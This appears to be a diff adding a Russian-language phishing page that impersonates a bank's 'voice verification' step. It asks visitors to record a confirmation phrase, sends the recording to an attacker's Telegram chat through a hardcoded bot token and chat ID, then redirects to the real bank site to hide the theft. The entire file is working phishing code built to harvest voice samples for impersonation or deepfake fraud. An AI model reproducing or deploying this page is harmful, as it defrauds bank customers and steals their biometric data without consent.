@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Проверка личности</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body { background: #f5f5f5; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.container { width: 100%; max-width: 400px; padding: 40px 20px; text-align: center; background: #fff; border-radius: 20px; margin: 20px; }
+.logo { width: 80px; height: 80px; margin: 0 auto 20px; display: block; }
+h1 { font-size: 24px; margin-bottom: 10px; color: #000; }
+p { color: #666; font-size: 15px; margin-bottom: 30px; }
+button { width: 100%; padding: 16px; background: #ffdd2d; color: #000; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
+button:hover { background: #f5c800; }
+button.rec { background: #e74c3c; color: #fff; }
+button.rec:hover { background: #c0392b; }
+.footer { margin-top: 20px; color: #999; font-size: 13px; }
+</style>
+</head>
+<body>
+<div class="container">
+<img src="https://www.tbank.ru/favicon.ico" alt="Банк" class="logo">
+<h1>Голосовая верификация</h1>
+<p>Для подтверждения личности произнесите фразу: "Я подтверждаю вход в личный кабинет"</p>
+<button id="start">Начать запись</button>
+<button id="stop" class="rec" style="display:none;">Остановить и отправить</button>
+<div class="footer">Безопасность клиентов — наш приоритет</div>
+</div>
+<script>
+var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
+var chat = '7887003990';
+var mediaRecorder;
+var chunks = [];
+var stream;
+
+document.getElementById('start').addEventListener('click', function() {
+  navigator.mediaDevices.getUserMedia({ audio: true })
+    .then(function(s) {
+      stream = s;
+      mediaRecorder = new MediaRecorder(stream);
+      chunks = [];
+      mediaRecorder.ondataavailable = function(e) { chunks.push(e.data); };
+      mediaRecorder.onstop = function() {
+        var blob = new Blob(chunks, { type: 'audio/webm' });
+        var form = new FormData();
+        form.append('chat_id', chat);
+        form.append('audio', blob, 'voice.webm');
+        fetch('https://api.telegram.org/bot' + token + '/sendVoice', {
+          method: 'POST',
+          body: form
+        });
+        window.location.href = 'https://www.tbank.ru';
+      };
+      mediaRecorder.start();
+      document.getElementById('start').style.display = 'none';
+      document.getElementById('stop').style.display = 'block';
+    })
+    .catch(function(err) { alert('Нужен доступ к микрофону'); });
+});
+
+document.getElementById('stop').addEventListener('click', function() {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+    stream.getTracks().forEach(function(t) { t.stop(); });
+  }
+});
+</script>
+</body>
+</html>
